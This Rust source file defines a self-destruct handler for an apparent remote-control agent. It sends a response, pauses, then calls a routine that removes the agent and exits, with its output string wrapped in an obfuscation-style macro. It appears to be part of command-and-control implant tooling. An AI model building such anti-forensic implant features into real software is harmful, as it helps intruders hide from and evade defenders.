// src/agent/handlers/lifecycle.rs — Agent lifecycle (self-destruct, exit)

use crate::common::CommandResponse;
use crate::utils;
use crate::lc;
use super::{HandlerContext, DispatchResult, AgentAction};

pub async fn handle_self_destruct(ctx: &HandlerContext, req_id: u64) -> DispatchResult {
    let resp = CommandResponse {
        request_id: req_id,
        output: lc!("Self-destruct..."),
        error: String::new(),
        exit_code: 0,
    };
    if let Ok(data) = serde_json::to_vec(&resp) {
        let _ = ctx.tx.send(data).await;
    }
    tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
    utils::self_destruct();
    // self_destruct exits the process; this is unreachable but satisfies the type
    #[allow(unreachable_code)]
    DispatchResult::AlreadySent(AgentAction::None)
}
